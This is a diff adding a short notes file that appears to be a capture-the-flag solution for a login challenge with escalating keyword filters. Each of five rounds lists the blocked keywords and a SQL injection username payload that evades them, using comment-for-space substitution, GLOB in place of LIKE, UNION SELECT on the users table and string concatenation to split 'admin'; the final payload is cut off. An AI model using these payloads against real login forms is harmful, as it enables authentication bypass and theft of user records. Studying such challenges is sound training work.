@@ -1,0 +1,14 @@
+round 1 : or
+user : admin' --
+
+round 2 : or and like = --
+user : admin' UNION SELECT * FROM users WHERE username<>'admin
+
+round 3 : or and = like > < -- whitespace
+user : admin'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/GLOB/**/'*
+
+round 4 : or and = like > < -- whitespace admin
+user : admi'||'n'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/GLOB/**/'*
+
+round 5 : or and = like > < -- whitespace admin union
+user : admi'||'n'/*
